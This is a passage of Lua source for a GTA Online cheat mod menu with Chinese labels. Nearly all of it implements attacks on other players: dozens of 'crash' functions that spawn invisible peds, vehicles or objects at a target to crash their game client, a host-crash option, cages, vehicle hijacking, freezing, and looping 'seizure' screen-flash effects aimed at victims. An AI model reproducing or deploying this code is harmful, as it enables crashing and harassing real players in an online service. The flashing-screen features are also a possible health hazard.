		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(PlayerID) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)

    menu.action(PlayerMainMenu, "懂哥崩", {"dongge"}, "", function()

    dongge(PlayerID)

    end)


    menu.action(PlayerMainMenu, "碎片崩溃V1", {"togglefragv1"}, "Skidded From 2take1", function(on_toggle)
        v1_frag(PlayerID)
        end)
        
        menu.toggle_loop(PlayerMainMenu, "碎片崩溃V2", {"togglefragv2"}, "", function(on_toggle)
            v2_frag(PlayerID)
        end)
        
        menu.toggle(PlayerMainMenu, "碎片崩溃V3", {"togglefragv3"}, "", function(on_toggle)
            notification("正在发送碎片崩溃V3给 " .. PLAYER.GET_PLAYER_NAME(PlayerID))
        if on_toggle then
                menu.trigger_commands("togglefragv1" .. players.get_name(PlayerID))
                menu.trigger_commands("togglefragv2" .. players.get_name(PlayerID))
        else
                menu.trigger_commands("togglefragv1" .. players.get_name(PlayerID))
                menu.trigger_commands("togglefragv2" .. players.get_name(PlayerID))
                menu.trigger_commands("superc")
            end
        
        end)

    menu.action(PlayerMainMenu, "泡泡糖崩溃", {""}, "", function()

    LilYachty(PlayerID)

    end)



    menu.action(PlayerMainMenu, "大自然崩溃", {"natural"}, "", function()

    natural(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "美杜莎崩溃", {}, "", function() 

    MDS(PlayerID)

    end)  

    menu.action(PlayerMainMenu, "大春逗崩溃", {""}, "来自X-Force", function(on_toggle)

    big_chungus(PlayerID)
        
    end)
    

    menu.action(PlayerMainMenu,"瘟疫崩溃", {"wenyi"}, "", function()

    wenyi(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "OX崩", {"OXCrash"}, "远离!!!远离!!!远离!!!远离!!!远离!!!远离!!!", function()

    

        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)

        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)

    

       local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)

        ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)

        util.yield(100)

        WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)

        util.yield(1000)

        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

        

        util.yield(10000)

    

        entities.delete_by_handle(PED1)

    

        

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_fabien模型")

            local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED2)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_manuel模型")

            local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED3)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_taostranslator模型")

            local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED4)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_taostranslator2模型")

            local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED5)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_tenniscoach模型")

            local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED6)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_wade模型")

            local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED7)

        end

        if not players.exists(PlayerID) then

            notification("成功移除玩家")

        end

    end)

    menu.action(PlayerMainMenu, "OX崩v2", {"OXv2"}, "", function()
        local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()),mypos.x+300,mypos.y+700,mypos.z+1500)
        ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(players.user()),true)
        local ppos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
        local crash_ped_hash = {3027157846,1191403201,4222842058,1397974313,3017289007,1545995274}
        local pheading = ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED(PlayerID))
        local attack_ped = {}
        local aida_ped = {}
            for i = 1,15 do
                aida_ped[i] = CreatePed(26,crash_ped_hash[math.random(#crash_ped_hash)],ppos,pheading,true,false)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(aida_ped[i],util.joaat("WEAPON_PUMPSHOTGUN"),1,true)
                WEAPON_SAVE_WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(aida_ped[i],false, false, false, false)
                ENTITY.SET_ENTITY_VISIBLE(aida_ped[i],false)
            end
            for i = 1,15 do
                attack_ped[i] = CreatePed(26,util.joaat(crash_ped_hash[math.random(#crash_ped_hash)]),ppos,pheading,true,false)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(attack_ped[i],util.joaat("WEAPON_PUMPSHOTGUN"),1,true)
                WEAPON_SAVE_WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(attack_ped[i],false, false, false, false)
                ped_attack_peds(attack_ped[i],aida_ped[i])
                ENTITY.SET_ENTITY_VISIBLE(attack_ped[i],false)
            end
            util.yield(6000)
            for i = 1,15 do
                entities.delete_by_handle(aida_ped[i])
                entities.delete_by_handle(attack_ped[i])
            end
        end)
    
        menu.action(PlayerMainMenu, "修复0xv2", {"fix ox"}, "", function()
            local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()), mypos.x, mypos.y, mypos.z)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(players.user()),false)
        end)
    
    

    menu.click_slider(PlayerMainMenu,"声音崩（不要连点）", {"sound crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)

        if on_change == 1 then	

            soundcrashv1(PlayerID)

        end   

        if on_change == 2 then

            soundcrashv2(PlayerID)

        end

    end)

    

    menu.action(PlayerMainMenu, "无效模型崩溃", {}, "", function()

    wxcrash(PlayerID)

    end)

    menu.action(PlayerMainMenu, "无效模型崩溃V2", {}, "", function()

        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza5 = CreateObject(3078201489, TargetPlayerPos)
        for i = 0, 100 do 
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        entities.delete_by_handle(Object_pizza5)
        menu.trigger_commands("anticrashcam off")
        end)

    local pclpid = {}
    function get_control_request(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            notification("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end

    menu.action(PlayerMainMenu, "幻想崩溃", {""}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 23 do
            local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(PlayerMainMenu, "布尔值崩溃", {""}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local coords = ENTITY.GET_ENTITY_COORDS(ped)
	local model = util.joaat("banshee")
	request_model(model)
	local vehicle = entities.create_vehicle(model,coords,0)
	VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
	ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
	VEHICLE.SET_VEHICLE_GRAVITY(vehicle, 0)
	for i=0, 49 do
		local max_mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)-1
		VEHICLE.SET_VEHICLE_MOD(vehicle, i, max_mod, false)
	end
	notification("发送实体崩溃")
    util.yield(10000)
	notification("布尔崩溃完成")
end)

    menu.action(PlayerMainMenu, "5G崩溃", {"5gcrash"}, "", function()

    five5crash(PlayerID)

    end)

    menu.action(PlayerMainMenu, "6G崩溃", {"6gcrash"}, "", function()

        six6crash(PlayerID)
        
    end)

    

    menu.action(PlayerMainMenu, "大JB崩", {"dick"}, "", function()

    dajibab(PlayerID)

    end)


    menu.action(PlayerMainMenu, "舞蹈崩", {""}, "", function()
        util.create_thread(function ()
            local model_array <const> = {0x58f77553,0x1446590a}
            local crash_c <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) crash_c.x = crash_c.x + 3
            local ped_ <const> = CreatePed(26,util.joaat("ig_kaylee"),crash_c,0)
            for spawn, vel in pairs(model_array) do
                local ves <const> = {}
                ves[spawn] = CreateVehicle(vel,crash_c,0)
                for key, value in pairs(ves) do
                    PED.SET_PED_INTO_VEHICLE(ped_,value,-1)
                    TASK.TASK_VEHICLE_HELI_PROTECT(ped_,value,players.user_ped(PlayerID),1,1,100,10,1)
                end
            end
            util.yield(2000)
            local vels_ <const> = entities.get_all_vehicles_as_handles()
            for delete, value in pairs(vels_) do
                entities.delete_by_handle(value)
                entities.delete_by_handle(ped_)
            end
        end,nil)
        util.create_thread(function ()
                    local position <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                    position.x = position.x + 3
                    local sb_ped <const> = CreatePed(26,util.joaat("a_c_rat"),position,0)
                    local crash_plane <const> = CreateVehicle(0x9c5e5644,position,0)
                    PED.SET_PED_INTO_VEHICLE(sb_ped,crash_plane,-1)
                    PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crash_plane,-1)
                    ENTITY.FREEZE_ENTITY_POSITION(crash_plane,true)
                    local time <const> = util.current_time_millis() + 3500
                    TASK.TASK_OPEN_VEHICLE_DOOR(players.user_ped(players.user()), crash_plane, 9999, -1, 2)
                    while time > util.current_time_millis() do
                        TASK.TASK_LEAVE_VEHICLE(sb_ped, crash_plane, 0)
                        util.yield(5)
                    end
                    entities.delete_by_handle(sb_ped)
               end,nil)
               util.create_thread(function ()
                local position <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                position.x = position.x + 3
                local rat <const> = CreatePed(26,util.joaat("a_c_rat"),position,0)
                ENTITY.SET_ENTITY_VISIBLE(rat,false)
                local obs <const> = OBJECT.CREATE_OBJECT_NO_OFFSET(1888301071,position.x,position.y,position.z,true,false)
                util.create_thread(function ()
                    local time <const> = util.current_time_millis() + 3500
                    while time > util.current_time_millis() do
                        TASK.TASK_CLIMB_LADDER(rat)	
                        util.yield(100)
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(rat)
                        entities.delete_by_handle(obs)
                    end
                end,nil)
            end,nil)
    end)


    

    menu.click_slider(PlayerMainMenu,"导弹车崩溃", {"ChernobogCrash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)

        if on_change == 1 then	

            daodanchev1(PlayerID) 

        end

        if on_change == 2 then	

            daodanchev2(PlayerID)

        end

    end)

    
    
    menu.action(PlayerMainMenu, "无效外观", {}, "", function()

    BadOutfitCrashV1(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "无效载具配件", {"BadNetVehicleCrash"}, "", function()
        BadNetVehicleCrashV2(PlayerID)
    end)

    menu.action(PlayerMainMenu, "单崩黄昏", {"crashnightfall"}, "", function()

    HHHM(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "拖车崩", {""}, "", function()

    tuocheb(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "主机崩", {}, "崩溃主机（请提前把主机优先级为最低）", function(PlayerID)

        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())

        menu.trigger_commands("tpmazehelipad")

        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)

        util.yield(1000)

        menu.trigger_commands("tpmazehelipad")

    end)

    

    menu.action(PlayerMainMenu, "鬼崩V1（切战局自崩）", {}, "遇事不决就用鬼崩", function()

    guibeng(PlayerID)

    end)

        menu.action(PlayerMainMenu, "鬼崩V2", {}, "遇事不决就用鬼崩", function()
            local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
                    local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                    local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
                    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
                    for i = 1, 3, 1 do
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
                        for spawn, value in pairs(model_array) do
                            local vels = {}
                            vels[spawn] = CreateVehicle(value, BAD_attach, 0)
                            for attach, value in pairs(vels) do
                                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
                            end
                        end
                        util.yield(500)
                        menu.trigger_commands("explode" ..  players.get_name(PlayerID))
                    end
    end)

    menu.action(PlayerMainMenu, "鬼崩V3", {}, "遇事不决就用鬼崩", function()
        pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        mypos = ENTITY.GET_ENTITY_COORDS(pedp, true)
        tr2 = 2078290630
        STREAMING.REQUEST_MODEL(tr2)
        local vehicle_ = entities.create_vehicle(tr2, mypos,0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle_, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
        playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i = 0, 10 do
        playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
        util.yield(15)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mypos.x, mypos.y, mypos.z, false, false, false)
        notification("鬼崩v3完成")
    end)

    menu.action(PlayerMainMenu,"TP", {""}, "传送到玩家", function()

        local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)

        local spped = PLAYER.PLAYER_PED_ID()

            local ye = ENTITY.GET_ENTITY_COORDS(TTPed, true)

            ENTITY.SET_ENTITY_COORDS(spped, ye.x, ye.y, ye.z, true, false, false)

            util.yield(10 * math.random())

    end)

    

        end

        players.on_join(GenerateFeatures)



local function playerActionsSetup(pid) 

    local playerMain = menu.list(Heezy, "恶搞", {""}, "")

    local playerOtherTrolling = menu.list(playerMain, "载具恶搞", {}, "")

menu.action(playerOtherTrolling,"传送载具到我", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		tp_player_vehicle(pid, pos)
	end)

    menu.action(playerOtherTrolling, "变成小恐龙", {""}, "", function(on_click)

        give_car_addon(pid, util.joaat("h4_prop_h4_loch_monster"), true, -90.0)

    end)



menu.action(playerOtherTrolling, "将墙放在玩家面前", {}, "在玩家面前放置墙壁,半秒后删除", function ()

qfmq(pid)

end)



menu.action(playerOtherTrolling, "将玩家传送到花园银行", {""}, "将玩家的车辆传送到花园银行的塔上", function()

sqhy(pid)

end)

		

menu.action(playerOtherTrolling, "将玩家传送到高空", {""}, "", function()

sqgk(pid)

end)

    

local unlocked_lock = {"不上锁","上锁"}

menu.slider_text(playerOtherTrolling, "劫持车辆", {"hijack"}, "随机 NPC 劫持他们的车辆", unlocked_lock, function(hijackLevel)

    hijacking_vehicles(pid)

end)



menu.toggle_loop(playerOtherTrolling, "随机升级", {"upgradevehicle"}, "", function()
random_upgrade(pid)
    util.yield(500)
end)



menu.toggle_loop(playerOtherTrolling, "让他以为自己能走", {""}, "假象", function ()

ywnz(pid)

end)



lz = menu.list(playerMain, "笼子恶搞", {""}, "")	



menu.action(lz, "笼子", {""}, "", function ()

ptlz(pid)

end)

menu.action(lz, "七度空间", {""}, "", function ()

qdkj(pid)

end)

menu.action(lz, "钱笼子", {""}, "", function ()

zdlz(pid)

end)

menu.action(lz, "垃圾箱", {""}, "", function ()

yylz(pid)

end)

menu.action(lz, "小车车", {""}, "", function ()

cclz(pid)

end)

menu.action(lz, "圣诞快乐", {""}, "", function ()

sdkl1(pid)

end)

menu.action(lz, "圣诞快乐pro", {""}, "", function ()

sdkl2(pid)

end)

menu.action(lz, "圣诞快乐promax", {""}, "", function ()

sdkl3(pid)

end)

menu.action(lz, "电击笼", {""}, "", function ()

djlz(pid)

end)

menu.action(lz, "竞技管", {""}, "", function ()

jjglz(pid)

end)

					

	local cage_loop = false

menu.toggle(lz, "新世纪全自动化套笼", {"autocage"}, "自动套笼子", function(on)

		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position

		cage_loop = on

		if cage_loop then

			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then

				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")

				util.yield(300)

				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then

					notification("踢出载具失败")

					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")

					return

				end

				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")

				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

			end

			cage_player(a)

		end

        if not players.exists(pid) then
            util.stop_thread()
end

		while cage_loop do

			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 

			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 

			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then 

				a = b

				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then

					goto continue

				end

				cage_player(a)

				notification(PLAYER.GET_PLAYER_NAME(pid).."跑出来了，再次套住")

				::continue::

			end

			util.yield(1000)

		end

	end)

menu.action(lz, "删除笼子", {""}, "只能删除简单的笼子", function() -- ez fix but lazy

	for key, value in pairs(cages) do

		entities.delete_by_handle(value)

	end

end)



cage_table = {}

menu.toggle_loop(lz,"Ped笼子", {'PCAGE'}, "将玩家困在Ped笼子里", function ()

    pedcageg(pid)

end)

menu.action(lz, "解除Ped笼", {'FreePedcage'}, "将玩家从Ped笼子中释放", function ()

    freecageg(pid)

end)



local jindianegao = menu.list(playerMain, "经典恶搞", {}, "") 
    seizures = menu.list(jindianegao, "闪屏", {}, "", function(); end)

    menu.toggle_loop(seizures, "6闪", {"seizurev1"}, "", function()
        if players.exists(pid) then
        seizurev6(pid)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(seizures, "闪屏 V1", {"seizurev1"}, "", function()
        if players.exists(pid) then
        seizurev1(pid)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)


    menu.toggle_loop(seizures, "闪屏 V2", {"seizurev2"}, "", function(on_toggle)
        if players.exists(pid) then
        seizurev2(pid)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle(seizures, "闪屏 V3", {"seizurev3"}, "", function(on_toggle)
        if players.exists(pid) then
    if on_toggle then
            menu.trigger_commands("seizurev1" .. players.get_name(pid))
            menu.trigger_commands("seizurev2" .. players.get_name(pid))
    else
            menu.trigger_commands("seizurev1" .. players.get_name(pid))
            menu.trigger_commands("seizurev2" .. players.get_name(pid))
        end
    end
end)

    blurred_screen = menu.list(jindianegao, "花屏", {}, "", function(); end)
    menu.toggle(blurred_screen, "花屏V1", {""}, "请远离该玩家", function(state)
        huaping_1 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_1 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V2", {""}, "请远离该玩家", function(state)
        huaping_2 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_2 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_paint_cans", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false) 
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V3", {""}, "请远离该玩家", function(state)
        huaping_3 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_3 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V4", {""}, "请远离该玩家", function(state)
        huaping_4 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_4 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_extinguisher_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V5", {""}, "请远离该玩家", function(state)
        huaping_5 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_5 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V6", {""}, "请远离该玩家", function(state)
        huaping_6 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_6 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
